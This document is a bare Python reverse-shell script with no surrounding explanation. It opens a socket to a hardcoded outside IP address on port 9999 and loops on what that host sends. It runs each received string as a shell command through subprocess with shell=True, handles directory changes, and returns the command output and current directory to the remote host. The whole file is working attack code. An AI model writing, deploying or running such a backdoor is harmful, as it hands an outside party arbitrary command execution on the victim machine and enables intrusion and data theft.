import socket
import os
import subprocess
import sys
import time

s = socket.socket()

host = '159.89.165.63'
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)

    if(data.decode("utf-8") == "exit"):
        time.sleep(2)
        sys.exit()

    if(data[:2].decode("utf-8") == "cd"):
        os.chdir(data[3:].decode("utf-8"))
        currentWD = os.getcwd() + "> "


    elif len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8") + "\n"
        currentWD = os.getcwd() + "> "

    s.send(str.encode(output_str + currentWD))